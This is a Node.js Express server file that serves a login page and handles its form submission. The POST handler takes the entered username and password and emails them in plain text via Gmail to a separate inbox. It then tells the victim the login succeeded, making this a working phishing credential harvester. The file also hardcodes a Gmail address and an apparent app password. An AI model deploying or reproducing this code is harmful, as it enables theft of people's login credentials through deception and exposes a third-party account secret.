const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const PORT = 4500;

app.use(cors());
app.use(bodyParser.json());

// ✅ Serve static files (HTML, CSS, JS)
app.use(express.static(__dirname));

// ✅ Serve main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// 📩 Handle POST form
app.post("/", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ msg: "Username and password are required" });
  }

  try {
    // 💌 Setup email transporter (Gmail example)
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "amarkp204@gmail.com", // your Gmail
        pass: "dnuvyybfxmkznbtk", // 🔹 your app password (no space!)
      },
    });

    // ✉️ Define the email content
    const mailOptions = {
      from: "amarkp204@gmail.com",
      to: "amarkp108@gmail.com", // your receiving email
      subject: "New Login Attempt (Demo)",
      text: `Username: ${username}\nPassword: ${password}`,
    };

    // 📬 Send email
    await transporter.sendMail(mailOptions);

    res.json({ msg: "Login successfully" });
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).json({ msg: "Failed to send message" });
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});

